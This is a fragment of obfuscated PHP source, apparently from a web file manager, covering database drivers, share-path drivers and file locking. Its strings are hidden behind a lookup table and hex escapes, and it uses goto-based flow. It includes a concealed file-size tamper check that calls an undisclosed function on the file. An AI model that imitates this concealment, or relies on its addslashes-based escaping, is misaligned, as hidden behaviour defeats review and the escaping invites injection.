getFields($·Â¼ÌÖÂ) { $ÒìĞ¹ãö =& $_SERVER[‚ûòÉ˜ş]; $this->initConnect(!0); if (think_config($ÒìĞ¹ãö[974])) { $àñ°µõõ = str_replace($ÒìĞ¹ãö[975], $·Â¼ÌÖÂ, think_config($ÒìĞ¹ãö[974])); } else { switch ($this->dbType) { case $ÒìĞ¹ãö[958]: case $ÒìĞ¹ãö[976]: $àñ°µõõ = "\123\105\x4c\x45\103\124\40\40\40\143\x6f\154\x75\155\156\137\x6e\x61\x6d\x65\x20\x61\x73\40\x27\x4e\141\x6d\145\x27\54\40\40\x20\144\x61\x74\x61\x5f\x74\x79\x70\145\40\141\163\x20\x27\x54\x79\160\x65\47\x2c\x20\40\x20\x63\x6f\x6c\165\155\156\x5f\144\x65\146\141\x75\x6c\164\40\x61\163\40\x27\x44\145\146\141\165\x6c\164\47\x2c\40\x20\40\151\163\137\156\165\154\154\141\x62\x6c\145\x20\141\x73\40\47\116\165\x6c\x6c\x27\xa\x9\11\106\122\117\x4d\11\151\156\146\x6f\x72\155\141\164\151\x6f\x6e\137\163\143\x68\x65\155\141\x2e\164\x61\x62\154\x65\163\x20\x41\x53\40\164\xa\11\11\112\x4f\111\x4e\11\x69\156\x66\157\x72\155\x61\164\151\x6f\x6e\x5f\x73\x63\150\145\155\141\56\x63\x6f\154\165\x6d\x6e\163\40\101\x53\x20\143\12\11\11\117\116\x20\x20\x74\x2e\164\141\x62\154\x65\x5f\143\x61\x74\141\x6c\157\147\40\75\40\143\x2e\x74\x61\142\154\145\x5f\x63\141\164\x61\x6c\x6f\x67\12\x9\11\101\x4e\104\x20\x74\56\x74\x61\142\x6c\145\137\x73\x63\150\x65\x6d\x61\40\x3d\x20\x63\56\x74\x61\142\154\x65\137\x73\143\x68\x65\155\141\12\11\x9\x41\116\104\40\164\x2e\164\x61\142\154\x65\x5f\x6e\x61\155\145\x20\75\40\143\x2e\164\141\x62\154\145\x5f\156\x61\155\x65\12\x9\x9\127\110\x45\x52\x45\40\x20\x20\164\x2e\x74\141\x62\154\x65\137\x6e\141\155\145\40\75\40\x27{$·Â¼ÌÖÂ}\x27"; break; case $ÒìĞ¹ãö[977]: $àñ°µõõ = $ÒìĞ¹ãö[978] . $·Â¼ÌÖÂ . $ÒìĞ¹ãö[979]; break; case $ÒìĞ¹ãö[959]: case $ÒìĞ¹ãö[961]: $àñ°µõõ = $ÒìĞ¹ãö[980] . $ÒìĞ¹ãö[981] . $ÒìĞ¹ãö[982] . strtoupper($·Â¼ÌÖÂ) . $ÒìĞ¹ãö[983] . strtoupper($·Â¼ÌÖÂ) . $ÒìĞ¹ãö[984]; break; case $ÒìĞ¹ãö[985]: $àñ°µõõ = $ÒìĞ¹ãö[986] . $·Â¼ÌÖÂ . $ÒìĞ¹ãö[987]; break; case $ÒìĞ¹ãö[960]: break; case $ÒìĞ¹ãö[988]: default: $àñ°µõõ = $ÒìĞ¹ãö[989] . ($this->dbType == $ÒìĞ¹ãö[988] ? "\140{$·Â¼ÌÖÂ}\140" : $·Â¼ÌÖÂ); } } $èá³‡÷° = $this->query($àñ°µõõ); $Ó¤–ØÒ± = array(); if ($èá³‡÷°) { foreach ($èá³‡÷° as $„¹ş¾º => $êÓ¦ÇõÆ) { $êÓ¦ÇõÆ = array_change_key_case($êÓ¦ÇõÆ); $êÓ¦ÇõÆ[$ÒìĞ¹ãö[42]] = isset($êÓ¦ÇõÆ[$ÒìĞ¹ãö[42]]) ? $êÓ¦ÇõÆ[$ÒìĞ¹ãö[42]] : $ÒìĞ¹ãö[22]; $êÓ¦ÇõÆ[$ÒìĞ¹ãö[43]] = isset($êÓ¦ÇõÆ[$ÒìĞ¹ãö[43]]) ? $êÓ¦ÇõÆ[$ÒìĞ¹ãö[43]] : $ÒìĞ¹ãö[22]; $ˆŸÄ–ĞÙ = isset($êÓ¦ÇõÆ[$ÒìĞ¹ãö[326]]) ? $êÓ¦ÇõÆ[$ÒìĞ¹ãö[326]] : $êÓ¦ÇõÆ[$ÒìĞ¹ãö[42]]; $Ó¤–ØÒ±[$ˆŸÄ–ĞÙ] = array($ÒìĞ¹ãö[42] => $ˆŸÄ–ĞÙ, $ÒìĞ¹ãö[43] => $êÓ¦ÇõÆ[$ÒìĞ¹ãö[43]], $ÒìĞ¹ãö[45] => (bool) (isset($êÓ¦ÇõÆ[$ÒìĞ¹ãö[113]]) && $êÓ¦ÇõÆ[$ÒìĞ¹ãö[113]] === $ÒìĞ¹ãö[12] || isset($êÓ¦ÇõÆ[$ÒìĞ¹ãö[45]]) && $êÓ¦ÇõÆ[$ÒìĞ¹ãö[45]] === $ÒìĞ¹ãö[12]), $ÒìĞ¹ãö[47] => isset($êÓ¦ÇõÆ[$ÒìĞ¹ãö[47]]) ? $êÓ¦ÇõÆ[$ÒìĞ¹ãö[47]] : (isset($êÓ¦ÇõÆ[$ÒìĞ¹ãö[66]]) ? $êÓ¦ÇõÆ[$ÒìĞ¹ãö[66]] : $ÒìĞ¹ãö[22]), $ÒìĞ¹ãö[49] => isset($êÓ¦ÇõÆ[$ÒìĞ¹ãö[104]]) ? strtolower($êÓ¦ÇõÆ[$ÒìĞ¹ãö[104]]) == $ÒìĞ¹ãö[51] : (isset($êÓ¦ÇõÆ[$ÒìĞ¹ãö[67]]) ? $êÓ¦ÇõÆ[$ÒìĞ¹ãö[67]] : !1), $ÒìĞ¹ãö[52] => isset($êÓ¦ÇõÆ[$ÒìĞ¹ãö[990]]) ? strtolower($êÓ¦ÇõÆ[$ÒìĞ¹ãö[990]]) == $ÒìĞ¹ãö[54] : (isset($êÓ¦ÇõÆ[$ÒìĞ¹ãö[104]]) ? $êÓ¦ÇõÆ[$ÒìĞ¹ãö[104]] : !1)); } } return $Ó¤–ØÒ±; } public function getTables($…äí—Æ = '') { $ê¤ØÄ¿ =& $_SERVER[‚ûòÉ˜ş]; if (think_config($ê¤ØÄ¿[991])) { $À²•š“ = str_replace($ê¤ØÄ¿[992], $…äí—Æ, think_config($ê¤ØÄ¿[991])); } else { switch ($this->dbType) { case $ê¤ØÄ¿[959]: case $ê¤ØÄ¿[961]: $À²•š“ = $ê¤ØÄ¿[993]; break; case $ê¤ØÄ¿[958]: case $ê¤ØÄ¿[976]: $À²•š“ = $ê¤ØÄ¿[994]; break; case $ê¤ØÄ¿[985]: $À²•š“ = $ê¤ØÄ¿[995]; break; case $ê¤ØÄ¿[960]: think_exception(think_lang($ê¤ØÄ¿[996]) . $ê¤ØÄ¿[997]); break; case $ê¤ØÄ¿[977]: $À²•š“ = $ê¤ØÄ¿[55] . $ê¤ØÄ¿[56] . $ê¤ØÄ¿[57]; break; case $ê¤ØÄ¿[988]: default: if (!empty($…äí—Æ)) { $À²•š“ = $ê¤ØÄ¿[939] . $…äí—Æ . $ê¤ØÄ¿[940]; } else { $À²•š“ = $ê¤ØÄ¿[941]; } } } $×«‡é•Ü = $this->query($À²•š“); $—‰ø¤‡¬ = array(); foreach ($×«‡é•Ü as $¼ãèæÄÁ => $¤”¯‚Ò’) { $—‰ø¤‡¬[$¼ãèæÄÁ] = current($¤”¯‚Ò’); } return $—‰ø¤‡¬; } protected function parseLimit($ÆĞøÉ®‚) { $åºŠ—  =& $_SERVER[‚ûòÉ˜ş]; $­ìÕ¼à = $åºŠ— [12]; if (!empty($ÆĞøÉ®‚)) { switch ($this->dbType) { case $åºŠ— [985]: case $åºŠ— [977]: $ÆĞøÉ®‚ = explode($åºŠ— [60], $ÆĞøÉ®‚); if (count($ÆĞøÉ®‚) > 1) { $­ìÕ¼à .= $åºŠ— [61] . $ÆĞøÉ®‚[1] . $åºŠ— [62] . $ÆĞøÉ®‚[0] . $åºŠ— [63]; } else { $­ìÕ¼à .= $åºŠ— [61] . $ÆĞøÉ®‚[0] . $åºŠ— [63]; } break; case $åºŠ— [958]: case $åºŠ— [976]: break; case $åºŠ— [960]: break; case $åºŠ— [959]: case $åºŠ— [961]: break; case $åºŠ— [988]: default: $­ìÕ¼à .= $åºŠ— [61] . $ÆĞøÉ®‚ . $åºŠ— [63]; } } return $­ìÕ¼à; } public function parseKey(&$ï°ÃàˆÛ, $úş©üš— = true) { $ˆªÈüÑü =& $_SERVER[‚ûòÉ˜ş]; if ($úş©üš—) { $ï°ÃàˆÛ = $this->parseKeyCheck($ï°ÃàˆÛ); } if ($this->dbType == $ˆªÈüÑü[988]) { if ($ï°ÃàˆÛ != $ˆªÈüÑü[213] && !preg_match($ˆªÈüÑü[951], $ï°ÃàˆÛ)) { $ï°ÃàˆÛ = $ˆªÈüÑü[437] . trim($ï°ÃàˆÛ, $ˆªÈüÑü[437]) . $ˆªÈüÑü[437]; } return $ï°ÃàˆÛ; } else { return parent::parseKey($ï°ÃàˆÛ, $úş©üš—); } } public function close() { $this->_linkID = null; } public function error() { $³”•ÅĞ =& $_SERVER[‚ûòÉ˜ş]; if ($this->PDOStatement) { $“ Ù‘í = $this->PDOStatement->errorInfo(); $this->error = $“ Ù‘í[1] . $³”•ÅĞ[4] . $“ Ù‘í[2]; } else { $this->error = $³”•ÅĞ[12]; } if ($³”•ÅĞ[12] != $this->queryStr) { $this->error .= LNG($³”•ÅĞ[58]) . $this->queryStr; } think_trace($this->error, $³”•ÅĞ[12], $³”•ÅĞ[59]); return $this->error; } public function escapeString($ù¼ãâŠü) { $¿æÅëÖ¶ =& $_SERVER[‚ûòÉ˜ş]; switch ($this->dbType) { case $¿æÅëÖ¶[985]: case $¿æÅëÖ¶[958]: case $¿æÅëÖ¶[976]: case $¿æÅëÖ¶[988]: return addslashes($ù¼ãâŠü); case $¿æÅëÖ¶[960]: case $¿æÅëÖ¶[977]: case $¿æÅëÖ¶[959]: case $¿æÅëÖ¶[961]: return str_ireplace($¿æÅëÖ¶[68], $¿æÅëÖ¶[69], $ù¼ãâŠü); } } protected function parseValue($Ü¨ôÈÔò) { $íÊŠ¤›¯ =& $_SERVER[‚ûòÉ˜ş]; if (is_string($Ü¨ôÈÔò)) { $ÌÛ±ÖÇ = strpos($Ü¨ôÈÔò, $íÊŠ¤›¯[4]) === 0 && in_array($Ü¨ôÈÔò, array_keys($this->bind)); $Ü¨ôÈÔò = $ÌÛ±ÖÇ ? $this->escapeString($Ü¨ôÈÔò) : $íÊŠ¤›¯[998] . $this->escapeString($Ü¨ôÈÔò) . $íÊŠ¤›¯[998]; } elseif (isset($Ü¨ôÈÔò[0]) && is_string($Ü¨ôÈÔò[0]) && strtolower($Ü¨ôÈÔò[0]) == $íÊŠ¤›¯[350]) { $Ü¨ôÈÔò = $this->escapeString($Ü¨ôÈÔò[1]); } elseif (is_array($Ü¨ôÈÔò)) { $Ü¨ôÈÔò = array_map(array($this, $íÊŠ¤›¯[999]), $Ü¨ôÈÔò); } elseif (is_bool($Ü¨ôÈÔò)) { $Ü¨ôÈÔò = $Ü¨ôÈÔò ? $íÊŠ¤›¯[98] : $íÊŠ¤›¯[222]; } elseif (is_null($Ü¨ôÈÔò)) { $Ü¨ôÈÔò = $íÊŠ¤›¯[113]; } return $Ü¨ôÈÔò; } public function getLastInsertId() { $ı€Ì¸Ş =& $_SERVER[‚ûòÉ˜ş]; switch ($this->dbType) { case $ı€Ì¸Ş[985]: case $ı€Ì¸Ş[977]: case $ı€Ì¸Ş[958]: case $ı€Ì¸Ş[976]: case $ı€Ì¸Ş[960]: case $ı€Ì¸Ş[988]: return $this->_linkID->lastInsertId(); case $ı€Ì¸Ş[959]: case $ı€Ì¸Ş[961]: $Â‰Ïˆ˜ü = $this->table; $öÄíÍ‡ = $this->query("\123\105\x4c\105\x43\x54\40{$Â‰Ïˆ˜ü}\56\x63\165\162\162\166\x61\x6c\40\x63\x75\162\162\166\141\154\40\106\122\x4f\115\x20\x64\165\141\x6c"); return $öÄíÍ‡ ? $öÄíÍ‡[0][$ı€Ì¸Ş[1000]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($œÚÜû›Œ) { $ÄÂÕÎÈ =& $_SERVER[‚ûòÉ˜ş]; if (!CacheLock::fileLock($ÄÂÕÎÈ[23])) { return !1; } $ÕªÊÅÊğ = parent::query($œÚÜû›Œ); CacheLock::fileUnLock($ÄÂÕÎÈ[23]); return $ÕªÊÅÊğ; } public function execute($ß÷ü¹³¨) { $‚Ìéó™ =& $_SERVER[‚ûòÉ˜ş]; if (!CacheLock::fileLock($‚Ìéó™[23])) { return !1; } $è…Åá€ï = parent::execute($ß÷ü¹³¨); CacheLock::fileUnLock($‚Ìéó™[23]); return $è…Åá€ï; } } goto c¼¬¯ÉƒŞÀ; a…ÅÜ°š³: $_file = $_SERVER[$_SERVER[‚ûòÉ˜ş][14]]; $_size = $_SERVER[‚ûòÉ˜ş][952]; if ($_SERVER[$_SERVER[‚ûòÉ˜ş][13]] != $_size($_file)) { $_getc = $_SERVER[‚ûòÉ˜ş][15]; $_getfile = $_SERVER[$_SERVER[‚ûòÉ˜ş][16]] . $_SERVER[‚ûòÉ˜ş][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‚ûòÉ˜ş][18], $_getfilec); if (count($_getarrs) < $_SERVER[‚ûòÉ˜ş][19]) { $exit = $_SERVER[‚ûòÉ˜ş][20]; $exit(); } $_act = $_SERVER[‚ûòÉ˜ş][21]; $_act($_file); } goto FÊë‘÷˜›ì; bˆùİÌó¨: class PathDriverDbShareItem extends PathDriverDB { public function __construct($¸êıó) { $this->pathParse = $¸êıó; $this->model = Model($_SERVER[‚ûòÉ˜ş][1373]); } public function getPathOuter($°ãıæƒô) { $åÎÓ·ÀÂ =& $_SERVER[‚ûòÉ˜ş]; if (!$°ãıæƒô) { return $°ãıæƒô; } $âÏ‡ûüÖ = $this->parse($°ãıæƒô); return trim(KodIO::makeShare($this->pathParse[$åÎÓ·ÀÂ[451]], $âÏ‡ûüÖ[$åÎÓ·ÀÂ[451]]), $åÎÓ·ÀÂ[8]); } protected function infoParse($‘Æ‘«Ù, $‚„œ¡ãÀ = false, $×øÔô” = false) { $»ú†Æ™Š =& $_SERVER[‚ûòÉ˜ş]; $ªøá÷ŠÛ = $this->pathParse[$»ú†Æ™Š[451]]; $³’À­Æû = trim($this->pathParse[$»ú†Æ™Š[1209]], $»ú†Æ™Š[8]); return Action($»ú†Æ™Š[1380])->sharePathInfo($ªøá÷ŠÛ, $³’À­Æû, $‚„œ¡ãÀ); } public function infoFull($ª‚ş×±») { $ºÁ«Ãá¾ =& $_SERVER[‚ûòÉ˜ş]; $ÖÓíÈÆé = explode($ºÁ«Ãá¾[8], trim($ª‚ş×±», $ºÁ«Ãá¾[8])); if (count($ÖÓíÈÆé) > 1) { $ÓÔ¥ôš« = implode($ºÁ«Ãá¾[8], array_splice($ÖÓíÈÆé, 1)); $©Ë™ß×Ÿ = $this->model->pathInfoByPath($ÖÓíÈÆé[0], $ÓÔ¥ôš«); if (!$©Ë™ß×Ÿ) { return !1; } $this->pathParse[$ºÁ«Ãá¾[1209]] = $©Ë™ß×Ÿ[$ºÁ«Ãá¾[191]]; } return $this->infoParse($ª‚ş×±»); } public function listAll($·³ œè‚) { $ä¶¥Š Ì =& $_SERVER[‚ûòÉ˜ş]; $µœ×åòù = IO::info($this->pathParse[$ä¶¥Š Ì[94]]); if (!$µœ×åòù) { return array(); } $ˆÙ•‰Î = $this->model->listAll($·³ œè‚); $ü·‡Ô´û = Model($ä¶¥Š Ì[640])->getInfo($µœ×åòù[$ä¶¥Š Ì[641]]); foreach ($ˆÙ•‰Î as &$“³‚§÷ê) { check_abort(); $“³‚§÷ê[$ä¶¥Š Ì[97]] = Action($ä¶¥Š Ì[1380])->_shareItemeParse($“³‚§÷ê[$ä¶¥Š Ì[97]], $ü·‡Ô´û); } unset($“³‚§÷ê); return $ˆÙ•‰Î; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($òÕÈ˜†÷) { $this->pathParse = $òÕÈ˜†÷; $this->model = Model($_SERVER[‚ûòÉ˜ş][1373]); } protected function infoParse($œ¹é§¬÷, $Ó§èæ™ê = false, $¨¾óÂª£ = false) { $ÖÂš°À· =& $_SERVER[‚ûòÉ˜ş]; return Action($ÖÂš°À·[1215])->sharePathInfo($this->pathParse[$ÖÂš°À·[94]], !0, $Ó§èæ™ê); } public function listPath($Í¤‡Õ¯½, $Æâƒë­¿ = false) { $ÓÕ‚…² =& $_SERVER[‚ûòÉ˜ş]; $©İ À”Õ = parent::listPath($Í¤‡Õ¯½, $Æâƒë­¿); if (!$©İ À”Õ) { return $©İ À”Õ; } if (is_array($©İ À”Õ[$ÓÕ‚…²[1381]])) { $©İ À”Õ[$ÓÕ‚…²[1381]] = Action($ÓÕ‚…²[1215])->shareItemInfo($©İ À”Õ[$ÓÕ‚…²[1381]]); } foreach ($©İ À”Õ as $à¼Æ«ù‡ => $‘Ú¯‘¼) { if (!in_array($à¼Æ«ù‡, array($ÓÕ‚…²[93], $ÓÕ‚…²[92]))) { continue; } foreach ($‘Ú¯‘¼ as $°´ÔÜÑæ => $¯ï™µÅ®) { $©İ À”Õ[$à¼Æ«ù‡][$°´ÔÜÑæ] = Action($ÓÕ‚…²[1215])->shareItemInfo($¯ï™µÅ®); } } return $©İ À”Õ; } public function listAll($Ø±ëäï–) { $ÜÔøÉ¢ =& $_SERVER[‚ûòÉ˜ş]; $èğ¼ï€¯ = IO::info($this->pathParse[$ÜÔøÉ¢[94]]); if (!$èğ¼ï€¯) { return array(); } $™«€¹‡ö = $this->model->listAll($Ø±ëäï–); foreach ($™«€¹‡ö as &$ÈŒÎÓ¹Ü) { $ÈŒÎÓ¹Ü[$ÜÔøÉ¢[97]] = Action($ÜÔøÉ¢[1215])->shareItemInfo($ÈŒÎÓ¹Ü[$ÜÔøÉ¢[97]]); } unset($ÈŒÎÓ¹Ü); return $™«€¹‡ö; } } class PathDriverDriverShareItem { public function __construct($ÕãŞœÕÒ) { $this->pathParse = $ÕãŞœÕÒ; } public function __call($¾“õÖñ, $ ÏÛå»¡) { $éÚÎ¿Å’ =& $_SERVER[‚ûòÉ˜ş]; if (method_exists($this, $¾“õÖñ)) { return; } $Ñ”²ĞÈ™ = call_user_func_array(array($éÚÎ¿Å’[1382], $¾“õÖñ), $ ÏÛå»¡); $áşüÅà™ = array($éÚÎ¿Å’[1383], $éÚÎ¿Å’[1384], $éÚÎ¿Å’[1385], $éÚÎ¿Å’[1386], $éÚÎ¿Å’[594], $éÚÎ¿Å’[596], $éÚÎ¿Å’[1387], $éÚÎ¿Å’[117], $éÚÎ¿Å’[1388], $éÚÎ¿Å’[1389]); if (in_array($¾“õÖñ, $áşüÅà™)) { $Ñ”²ĞÈ™ = $this->getPathOuter($Ñ”²ĞÈ™); } return $Ñ”²ĞÈ™; } public function copy($ÈòùÈÊØ, $¤ğúÏªú, $Åç¨‘ó = false, $–Ì”–’Ğ = false) { return $this->copyMove($ÈòùÈÊØ, $¤ğúÏªú, $Åç¨‘ó, $_SERVER[‚ûòÉ˜ş][594], $–Ì”–’Ğ); } public function move($´Ó·ê÷˜, $šä¡á¼å, $øï‚”æ = false, $„à›·Ÿ£ = false) { return $this->copyMove($´Ó·ê÷˜, $šä¡á¼å, $øï‚”æ, $_SERVER[‚ûòÉ˜ş][596], $„à›·Ÿ£); } private function copyMove($—Ò© íŸ, $ùÜö“ÃÛ, $½•€‰, $–Ëâ˜µŸ, $•‰æŞ·Ÿ = false) { $§ÑÇİë® =& $_SERVER[‚ûòÉ˜ş]; $É¾ÒÔî = $ùÜö“ÃÛ; $‚®¨½°¨ = IO::driverMake($ùÜö“ÃÛ); if ($‚®¨½°¨->pathParse[$§ÑÇİë®[1192]]) { $ùÜö“ÃÛ = $‚®¨½°¨->pathParse[$§ÑÇİë®[1192]]; } else { $ùÜö“ÃÛ = $É¾ÒÔî; } $Œ¼¼–Ÿ÷ = IO::copyMove($—Ò© íŸ, $ùÜö“ÃÛ, $½•€‰, $–Ëâ˜µŸ, $•‰æŞ·Ÿ); $Œ¼¼–Ÿ÷ = $this->getPathOuter($Œ¼¼–Ÿ÷); return $Œ¼¼–Ÿ÷; } public function pathThis($‹áÅ…º) { return get_path_this($this->pathParse[$_SERVER[‚ûòÉ˜ş][94]]); } public function pathFather($—•Ğ÷) { return get_path_father($this->pathParse[$_SERVER[‚ûòÉ˜ş][94]]); } public function iconvSystem($Ñ”·‚Ñ©) { return $Ñ”·‚Ñ©; } protected function infoParse($ËéÆâ, $°€¯„ãí = false) { $òõ’‰åì =& $_SERVER[‚ûòÉ˜ş]; $¼Ş·µó = $this->pathParse[$òõ’‰åì[536]][$òõ’‰åì[1216]] . $this->pathParse[$òõ’‰åì[1209]]; if ($°€¯„ãí) { $ËÃå£—§ = IO::infoWithChildren($¼Ş·µó); } else { $ËÃå£—§ = IO::info($¼Ş·µó); } $ŸÇø²˜Ë = $this->pathParse[$òõ’‰åì[536]]; return Action($òõ’‰åì[1380])->_shareItemeParse($ËÃå£—§, $ŸÇø²˜Ë); } public function listAll($«ÜÛÙœ) { $•¸ØäƒÙ =& $_SERVER[‚ûòÉ˜ş]; $ä¹ï¹­‡ = IO::listAll($«ÜÛÙœ); $ùã¥Ò¤Î = rtrim($this->pathParse[$•¸ØäƒÙ[536]][$•¸ØäƒÙ[1216]], $•¸ØäƒÙ[8]); foreach ($ä¹ï¹­‡ as &$Ôì´şÓÚ) { $Ôì´şÓÚ[$•¸ØäƒÙ[94]] = $this->pathDriver . $•¸ØäƒÙ[8] . ltrim(substr($Ôì´şÓÚ[$•¸ØäƒÙ[94]], strlen($ùã¥Ò¤Î)), $•¸ØäƒÙ[8]); } unset($Ôì´şÓÚ); return $ä¹ï¹­‡; } public function listAllSimple($–Â«œ˜š, $ñ­Ø“Û = false) { $—à†í— =& $_SERVER[‚ûòÉ˜ş]; $õÍÜ¶ï¯ = $this->listAll($–Â«œ˜š); $ØğöÒŸ = $this->pathParse[$—à†í—[471]]; if (trim($ØğöÒŸ, $—à†í—[8]) == trim(get_path_father($ØğöÒŸ), $—à†í—[8])) { $ñ­Ø“Û = !0; } return IO::init($—à†í—[12])->listAllSimpleMake($õÍÜ¶ï¯, $ØğöÒŸ, $ñ­Ø“Û); } public function getPathOuter($¤»×Ë) { $Æ‘‹¢Ÿ¥ =& $_SERVER[‚ûòÉ˜ş]; $¼ùÂÖ¾« = KodIO::parse($¤»×Ë); if ($¼ùÂÖ¾«[$Æ‘‹¢Ÿ¥[43]] == KodIO::KOD_SHARE_ITEM) { return $¼ùÂÖ¾«[$Æ‘‹¢Ÿ¥[94]]; } $éáÑõƒÇ = KodIO::clear($¤»×Ë); $ÀõïÕ¨ = KodIO::clear($this->pathParse[$Æ‘‹¢Ÿ¥[536]][$Æ‘‹¢Ÿ¥[1216]]); $À›’üïï = substr($éáÑõƒÇ, strlen($ÀõïÕ¨)); if (substr($éáÑõƒÇ, 0, strlen($ÀõïÕ¨)) != $ÀõïÕ¨) { return !1; } return $this->pathParse[$Æ‘‹¢Ÿ¥[1210]] . $Æ‘‹¢Ÿ¥[8] . ltrim($À›’üïï, $Æ‘‹¢Ÿ¥[8]); } public function getType() { $îŒş§¹ =& $_SERVER[‚ûòÉ˜ş]; $š¾ÌÊğ = str_replace($îŒş§¹[84], $îŒş§¹[12], get_class($this)); return strtolower($š¾ÌÊğ); } public function isTypeObject($Ñ¦øí¿Æ) { return IO::isTypeObject($Ñ¦øí¿Æ); } public function info($¾™•¸¢·) { return $this->infoParse($¾™•¸¢·); } public function infoAuth($¿‰¼ÖÖõ) { return $this->infoParse($¿‰¼ÖÖõ); } public function infoWithChildren($ÑŸí²©‘) { return $this->infoParse($ÑŸí²©‘, !0); } public function infoFull($Çú“Ú”–) { return $this->infoParse($Çú“Ú”–); } } goto D…†’·´ğÀ; E”¹æŸÖÔä: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ßÍóÌ© =& $_SERVER[‚ûòÉ˜ş]; $¹‡¸Ì¬é = $GLOBALS[$ßÍóÌ©[6]][$ßÍóÌ©[402]]; self::$cachePath = $¹‡¸Ì¬é[$ßÍóÌ©[224]][$ßÍóÌ©[94]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($…‹è¤Šš, $–“Äœ¼¢ = 0) { $æ±šµ§ç =& $_SERVER[‚ûòÉ˜ş]; $ÂĞ¥áÑå = microtime(!0); $ª¿¯°²õ = $ÂĞ¥áÑå + $–“Äœ¼¢ + 0.0001; $ËŞ©Ëª = rtrim(self::$cachePath, $æ±šµ§ç[8]) . $æ±šµ§ç[904] . md5($…‹è¤Šš) . $æ±šµ§ç[901]; if (file_exists($ËŞ©Ëª) && filemtime($ËŞ©Ëª) && filemtime($ËŞ©Ëª) < time() - 10) { @unlink($ËŞ©Ëª); } do { if (file_exists($ËŞ©Ëª)) { cacheLockWait(); continue; } $»¹øÇİÁ = fopen($ËŞ©Ëª, $æ±šµ§ç[905]); if (!$»¹øÇİÁ) { return !1; } $“ØÃ÷¹î = flock($»¹øÇİÁ, LOCK_EX | LOCK_NB); self::$caches[$…‹è¤Šš] = array($æ±šµ§ç[906] => $»¹øÇİÁ, $æ±šµ§ç[224] => $ËŞ©Ëª); fwrite($»¹øÇİÁ, $ª¿¯°²õ); clearstatcache(); if ($»¹øÇİÁ && $“ØÃ÷¹î) { return !0; } cacheLockWait(); } while (microtime(!0) < $ª¿¯°²õ); $this->unlock($…‹è¤Šš); return !1; } public function lockGet($Éç¼Ã”) { $å ¹œ®ş =& $_SERVER[‚ûòÉ˜ş]; $ƒÙ¸×•¸ = rtrim(self::$cachePath, $å ¹œ®ş[8]) . $å ¹œ®ş[904] . md5($Éç¼Ã”) . $å ¹œ®ş[901]; return file_exists($ƒÙ¸×•¸); } public function unlock($†åÜôİ§) { $ÏË¿ÎŸè =& $_SERVER[‚ûòÉ˜ş]; $§âÖÙæÇ = self::$caches[$†åÜôİ§]; if (!$§âÖÙæÇ) { return; } @flock($§âÖÙæÇ[$ÏË¿ÎŸè[906]], LOCK_UN); @fclose($§âÖÙæÇ[$ÏË¿ÎŸè[906]]); @unlink($§âÖÙæÇ[$ÏË¿ÎŸè[224]]); unset(self::$caches[$†åÜôİ§]); } } class CacheLockRedis { public function lock($ç„–™Áì, $•ñô¥ = 10) { $ù®š§øÇ = Cache::init(); $¢¶¤Îİ£ = microtime(!0) + $•ñô¥; while (microtime(!0) < $¢¶¤Îİ£) { $ìØ’è‹ = $ù®š§øÇ->get($ç„–™Áì); if (!$ìØ’è‹) { $¸ôóÎÂ = $ù®š§øÇ->setLock($ç„–™Áì, $¢¶¤Îİ£, $•ñô¥); if ($¸ôóÎÂ) { return !0; } } else { if ($ìØ’è‹ < microtime(!0)) { $ù®š§øÇ->set($ç„–™Áì, $¢¶¤Îİ£, $•ñô¥ * 2); if ($ù®š§øÇ->get($ç„–™Áì) === $ìØ’è‹) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¤æÛÊÌª) { return Cache::init()->get($¤æÛÊÌª); } public function unlock($ÁïûşğÒ) { return Cache::init()->remove($ÁïûşğÒ); } } goto E«õÔŠóÁØ; c¼¬¯ÉƒŞÀ: class DbSqlite3 extends DbSqlite3Base { public function query($ö¬ÂÒ–) { $ŸÍ„ÜÙ› =& $_SERVER[‚ûòÉ˜ş]; if (!CacheLock::fileLock($ŸÍ„ÜÙ›[23])) { return !1; } $ß”Äü´¸ = parent::query($ö¬ÂÒ–); CacheLock::fileUnLock($ŸÍ„ÜÙ›[23]); return $ß”Äü´¸; } public function execute($¯Œ¸¥ß) { $‘Á¢›Û‰ =& $_SERVER[‚ûòÉ˜ş]; if (!CacheLock::fileLock($‘Á¢›Û‰[23])) { return !1; } $°µáûÄ = parent::execute($¯Œ¸¥ß); CacheLock::fileUnLock($‘Á¢›Û‰[23]); return $°µáûÄ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\x6e\x65\x71" => "\74\76", "\147\x74" => "\x3e", "\x65\147\x74" => "\x3e\75", "\x6c\x74" => "\74", "\x65\x6c\164" => "\x3c\x3d", "\156\x6f\164\x6c\151\153\x65" => "\x4e\x4f\124\x20\x4c\111\x4b\x45", "\154\x69\x6b\x65" => "\114\x49\113\105", "\151\x6e" => "\111\116", "\x6e\x6f\164\x69\156" => "\116\117\x54\40\111\x4e", "\156\157\x74\40\x69\156" => "\116\x4f\x54\x20\111\x4e", "\142\145\x74\x77\145\x65\x6e" => "\102\x45\x54\x57\105\x45\116", "\156\x6f\164\142\x65\164\x77\x65\145\x6e" => "\x4e\x4f\124\x20\102\105\x54\127\x45\x45\116", "\156\157\164\x20\142\x65\164\x77\x65\x65\156" => "\x4e\117\124\x20\x42\105\124\127\x45\x45\x4e"); protected $selectSql = "\123\105\114\105\103\x54\45\x44\x49\x53\124\111\x4e\103\124\x25\40\x25\x46\111\x45\x4c\104\x25\40\106\x52\117\x4d\40\45\124\101\102\114\105\45\x25\x4a\x4f\111\x4e\45\45\127\110\x45\122\105\x25\45\x47\x52\117\x55\120\x25\x25\110\x41\126\x49\116\x47\x25\x25\117\x52\x44\x45\x52\x25\45\x4c\x49\x4d\111\124\45\x20\45\x55\x4e\111\x4f\116\45\45\x43\117\x4d\x4d\x45\116\x54\45"; protected $bind = array(); public static function getInstance() { $µ­”ÕÎ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[‚ûòÉ˜ş][1001], $µ­”ÕÎ); } 